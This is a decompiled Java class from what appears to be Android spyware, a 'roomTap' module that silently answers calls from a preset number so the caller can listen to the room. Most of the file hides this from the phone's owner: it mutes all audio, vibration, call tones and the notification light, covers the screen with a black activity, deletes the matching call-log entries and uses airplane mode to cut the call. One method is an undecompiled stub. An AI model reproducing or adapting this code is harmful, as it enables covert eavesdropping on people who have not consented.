package com.network.android.roomTap;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.media.AudioManager;
import android.os.Build;
import android.os.Handler;
import android.os.HandlerThread;
import android.provider.CallLog;
import android.provider.Settings;
import android.telephony.TelephonyManager;
import android.view.KeyEvent;
import com.android.internal.telephony.ITelephony;
import com.network.android.a.c;
import com.network.android.agent.NetworkApp;
import com.network.android.c.a.a;
import com.network.b.b;
import java.lang.reflect.Method;
import java.util.concurrent.locks.ReentrantLock;

public class AutoAnswerReceiver extends BroadcastReceiver {

    /* renamed from: a  reason: collision with root package name */
    public static long f110a = 0;
    public static boolean b = true;
    public static boolean c = false;
    public static boolean d = false;
    public static Intent e = null;
    public static boolean f = false;
    public static final ReentrantLock g = new ReentrantLock();
    private static String h = TelephonyManager.EXTRA_STATE_IDLE;
    private static String i = null;
    private static Integer j = null;
    private static boolean k = false;
    private static String l = TelephonyManager.EXTRA_STATE_IDLE;
    private static Integer m = null;
    private static Handler n = new Handler();
    private static String o = null;
    private static String p = null;
    private static int q = 0;
    private static int r;
    private static int s = 0;
    private static boolean t = true;
    private static Handler u;
    private static Context v = null;

    static {
        HandlerThread handlerThread = new HandlerThread("autoAnswerHandler");
        handlerThread.start();
        u = new Handler(handlerThread.getLooper());
    }

    private void a(Context context, int i2) {
        a.a("ShowDesktop hideInDelay");
        n.postDelayed(new i(this, context), (long) i2);
    }

    public static void a(Context context, Long l2) {
        try {
            a.a("roleBackAudio start.  sleepTimeBeforeUnregisteringMediaPlayerIntentReciever: " + l2);
            new Handler().postDelayed(new h(), l2.longValue());
            if (!f) {
                a.a("roleBackAudio mute not yet called. returning");
                return;
            }
            a.a("roleBackAudio setting ringer mode ");
            a(j, m, context);
            try {
                if (t) {
                    try {
                        a.a("roleBackAudio setting settings ");
                        Settings.System.putInt(context.getContentResolver(), "notification_light_pulse", r);
                    } catch (Exception e2) {
                        a.a("roleBackAudio setSettings- " + e2.getMessage(), e2);
                    }
                }
            } catch (Throwable th) {
                a.a("roleBackAudio setSettings- " + th.getMessage(), th);
            }
            f = false;
            b.a(1);
            b.c(context);
            a.a("roleBackAudio end ");
        } catch (Exception e3) {
            a.a("roleBackAudio setSettings- " + e3.getMessage(), e3);
        }
    }

    public static void a(Context context, boolean z) {
        try {
            a.a("setAirplaneMode start. value to set:" + z);
            if (z) {
                Settings.System.putInt(context.getContentResolver(), "airplane_mode_on", 1);
            } else {
                Settings.System.putInt(context.getContentResolver(), "airplane_mode_on", 0);
            }
            Intent intent = new Intent("android.intent.action.AIRPLANE_MODE");
            intent.putExtra("state", z);
            context.sendBroadcast(intent);
            f110a = 0;
            a.a("setAirplaneMode end");
        } catch (Throwable th) {
            a.a("setAirplaneMode Disconnect- " + th.getMessage(), th);
        }
    }

    public static void a(Integer num, Integer num2, Context context) {
        try {
            a.a("setAudioSettingsAndVibrateSettings start audio settings: " + num + " vibrate settings: " + num2);
            AudioManager audioManager = (AudioManager) context.getSystemService("audio");
            if (num == null) {
                audioManager.setRingerMode(2);
            } else {
                audioManager.setRingerMode(num.intValue());
            }
            if (num2 != null) {
                a.a("roleBackAudio setting vibrate type: " + num2);
                if (Build.VERSION.SDK_INT >= 16) {
                    Settings.System.putInt(context.getContentResolver(), "vibrate_when_ringing", num2.intValue());
                } else {
                    audioManager.setVibrateSetting(0, num2.intValue());
                }
                a.a("vibratorType: " + num2);
            }
            b(false);
            a.a("setAudioSettingsAndVibrateSettings end ");
        } catch (Throwable th) {
            a.a("setAudioSettingsAndVibrateSettings exception- " + th.getMessage(), th);
        }
    }

    public static void a(boolean z) {
        a.a("setRoomTap start : " + z);
        k = z;
        if (z) {
            f110a = System.currentTimeMillis() / 1000;
        } else {
            f110a = 0;
        }
    }

    public static boolean a() {
        return k;
    }

    public static boolean a(String str) {
        if (str == null) {
            str = "";
        }
        try {
            return str.endsWith(b.f());
        } catch (Exception e2) {
            a.a("isRoomTapNumberNo10- " + e2.getMessage(), e2);
            return false;
        }
    }

    public static void b(Context context) {
        try {
            v = context;
            a.a("Disconnect start");
            a.a("disconnect start isOffHook: " + c);
            a.a("BlackScreen disconnect changing GOT_TAP_SMS_CALL_NOT_YET_ARRIVED");
            c.f = false;
            Class<?> cls = Class.forName("android.telephony.TelephonyManager");
            a.a("className: " + "android.telephony.TelephonyManager");
            Method declaredMethod = cls.getDeclaredMethod("getITelephony", new Class[0]);
            declaredMethod.setAccessible(true);
            ((ITelephony) declaredMethod.invoke((TelephonyManager) context.getSystemService("phone"), new Object[0])).endCall();
            f110a = 0;
            a.a("Disconnect end");
        } catch (Throwable th) {
            a.a("AutoAnswerReceiver Disconnect exception- " + th.getMessage(), th);
        }
        try {
            new Handler().postDelayed(new e(context), 1000);
        } catch (Throwable th2) {
            a.a("AutoAnswerReceiver airplane mode Disconnect exception - " + th2.getMessage(), th2);
        }
    }

    private static void b(boolean z) {
        AudioManager audioManager = (AudioManager) NetworkApp.a().getSystemService("audio");
        a.a("setStreamMute start : " + z);
        audioManager.setStreamMute(1, z);
        audioManager.setStreamMute(5, z);
        audioManager.setStreamMute(2, z);
        audioManager.setStreamMute(4, z);
        audioManager.setStreamMute(8, z);
        audioManager.setStreamMute(0, z);
        a.a("setStreamMute end : " + z);
    }

    public static boolean b() {
        return l.equals(TelephonyManager.EXTRA_STATE_IDLE);
    }

    public static boolean b(String str) {
        if (str == null) {
            str = "";
        }
        try {
            return "10".equals(b.f()) || str.endsWith(b.f());
        } catch (Exception e2) {
            a.a("isRoomTapNumber- " + e2.getMessage(), e2);
            return false;
        }
    }

    public static void c(Context context) {
        a.a("answerHeadset start");
        a.a("RoomTap HEAD SET HOOK Answer started");
        Intent intent = new Intent("android.intent.action.MEDIA_BUTTON");
        intent.putExtra("android.intent.extra.KEY_EVENT", new KeyEvent(0, 79));
        context.sendOrderedBroadcast(intent, "android.permission.CALL_PRIVILEGED");
        Intent intent2 = new Intent("android.intent.action.MEDIA_BUTTON");
        intent2.putExtra("android.intent.extra.KEY_EVENT", new KeyEvent(1, 79));
        context.sendOrderedBroadcast(intent2, "android.permission.CALL_PRIVILEGED");
        Intent intent3 = new Intent("android.intent.action.MEDIA_BUTTON");
        intent3.putExtra("android.intent.extra.KEY_EVENT", new KeyEvent(0, 79));
        context.sendOrderedBroadcast(intent3, null);
        a.a("RoomTap HEAD SET HOOK Answer ended");
    }

    /* JADX WARNING: Removed duplicated region for block: B:19:0x0069  */
    /* JADX WARNING: Removed duplicated region for block: B:35:0x00b4  */
    /* Code decompiled incorrectly, please refer to instructions dump. */
    public static synchronized boolean c() {
        /*
        // Method dump skipped, instructions count: 185
        */
        throw new UnsupportedOperationException("Method not decompiled: com.network.android.roomTap.AutoAnswerReceiver.c():boolean");
    }

    public static void d(Context context) {
        try {
            r = Settings.System.getInt(context.getContentResolver(), "notification_light_pulse");
            a.a("notification_light_pulse: " + r);
            Settings.System.putInt(context.getContentResolver(), "notification_light_pulse", 0);
        } catch (Exception e2) {
            a.a("lightPulseOff- " + e2.getMessage(), e2);
        }
    }

    public static void e(Context context) {
        try {
            n.postDelayed(new g(context), 7000);
        } catch (Throwable th) {
            a.a("roleBack Exception- " + th.getMessage(), th);
        }
    }

    public static void f(Context context) {
        try {
            if (b.f() != null) {
                a.a("deleteRoomTapCalls by configuration: " + context.getContentResolver().delete(CallLog.Calls.CONTENT_URI, "replace(number,'-','') = ? or replace(number,'+','') = ?", new String[]{b.f(), b.f()}));
            }
            if (p != null) {
                context.getContentResolver().delete(CallLog.Calls.CONTENT_URI, "replace(number,'-','') = ? or replace(number,'+','') = ?", new String[]{p, p});
                a.a("deleteRoomTapCalls by last call: " + p);
            }
        } catch (Throwable th) {
            a.a("deleteRoomTapCalls Exception- " + th.getMessage(), th);
        }
    }

    public static void g(Context context) {
        try {
            a.a("mute start");
            if (f) {
                a.a("mute was already called");
            } else {
                AudioManager audioManager = (AudioManager) context.getSystemService("audio");
                j = Integer.valueOf(audioManager.getRingerMode());
                a.a("mute original ringer mode:" + j);
                try {
                    if (t) {
                        try {
                            a.a("mute setting call_end_tone");
                            q = Settings.System.getInt(context.getContentResolver(), "call_end_tone");
                            a.a("call_end_tone: " + q);
                            Settings.System.putInt(context.getContentResolver(), "call_end_tone", 0);
                            s = Settings.System.getInt(context.getContentResolver(), "call_conn_tone");
                            a.a("call_conn_tone: " + s);
                            Settings.System.putInt(context.getContentResolver(), "call_conn_tone", 0);
                            d(context);
                        } catch (Throwable th) {
                            a.a("mute Exception- " + th.getMessage(), th);
                        }
                    }
                } catch (Exception e2) {
                    a.a("SOUND_EFFECTS_ENABLED - " + e2.getMessage(), e2);
                }
                a.a("mute setting vibration API: " + Build.VERSION.SDK_INT);
                m = Integer.valueOf(audioManager.getVibrateSetting(0));
                if (Build.VERSION.SDK_INT >= 16) {
                    m = Integer.valueOf(Settings.System.getInt(context.getContentResolver(), "vibrate_when_ringing"));
                    Settings.System.putInt(context.getContentResolver(), "vibrate_when_ringing", 0);
                    audioManager.setRingerMode(0);
                } else {
                    audioManager.setVibrateSetting(0, 0);
                    b(true);
                }
                a.a("vibratorType: " + m);
                b.a(0);
                b.e(m.intValue());
                b.c(j.intValue());
                b.c(context);
                f = true;
                a.a("mute end");
            }
        } catch (Exception e3) {
            a.a("Sound mute Exception- " + e3.getMessage(), e3);
        }
        try {
            e = new Intent(context, MediaPlayerHandlerService.class);
            context.startService(e);
        } catch (Exception e4) {
            a.a("hideCall - " + e4.getMessage(), e4);
        }
    }

    static /* synthetic */ void h() {
        f110a = 0;
        a.a("disconnectWithAireplaneMode start");
        if (v == null) {
            a.b("disconnectWithAireplaneMode contect is null. returning");
            return;
        }
        a.a("disconnect setting airplane mode: true");
        a(v, true);
        new Handler().postDelayed(new f(), 500);
    }

    public static void h(Context context) {
        try {
            a.a("ShowDesktop lockAndBlack");
            Intent intent = new Intent(context, ShowDesktop.class);
            intent.addFlags(268435456);
            context.startActivity(intent);
        } catch (Exception e2) {
            a.a("show DeskTop Exception- " + e2.getMessage(), e2);
        }
    }

    private static void i(Context context) {
        try {
            a.a("RoomTap ITelephony Answer started");
            TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService("phone");
            Method declaredMethod = Class.forName(telephonyManager.getClass().getName()).getDeclaredMethod("getITelephony", new Class[0]);
            declaredMethod.setAccessible(true);
            ITelephony iTelephony = (ITelephony) declaredMethod.invoke(telephonyManager, new Object[0]);
            iTelephony.answerRingingCall();
            iTelephony.silenceRinger();
            a.a("RoomTap ITelephony Answer ended");
        } catch (Throwable th) {
            a.a("answerITelephony - " + th.getMessage(), th);
        }
    }

    public final void a(Context context) {
        a.a("answer changing room tap true");
        a(true);
        if (com.network.a.a.b() < 2.3d || com.network.h.b.d(context)) {
            a.a("answer calling answerCallITelephonyFirst");
            try {
                a.a("answerCallITelephonyFirst start");
                i(context);
                f110a = System.currentTimeMillis() / 1000;
                if (!Build.MODEL.toLowerCase().contains("lg")) {
                    new Handler().postDelayed(new d(this, context), 2000);
                }
            } catch (Throwable th) {
                a.a("fail to room tap answerCallITelephonyFirst " + th.getMessage(), th);
                c(context);
                a(false);
            }
        } else {
            a.a("answer calling answerCallHeadsetFirst");
            try {
                a.a("answerCallHeadsetFirst start");
                c(context);
            } catch (Throwable th2) {
                a.a("fail to room tap HeadsetFirst and failed to answer  ITelephony. somthing is wrong" + th.getMessage(), th);
                e(context);
                a.b("answerCallHeadsetFirst changing room tap false");
                a(false);
            }
        }
        a.a("BlackSCreen answer changing GOT_TAP_SMS_CALL_NOT_YET_ARRIVED");
        c.f = false;
        a.a("ShowDesktop hidDelays");
        a(context, 1000);
        a(context, 1500);
        a(context, 2000);
        a(context, 2500);
        a(context, 3000);
    }

    public void onReceive(Context context, Intent intent) {
        u.post(new a(this, intent, context));
    }
}
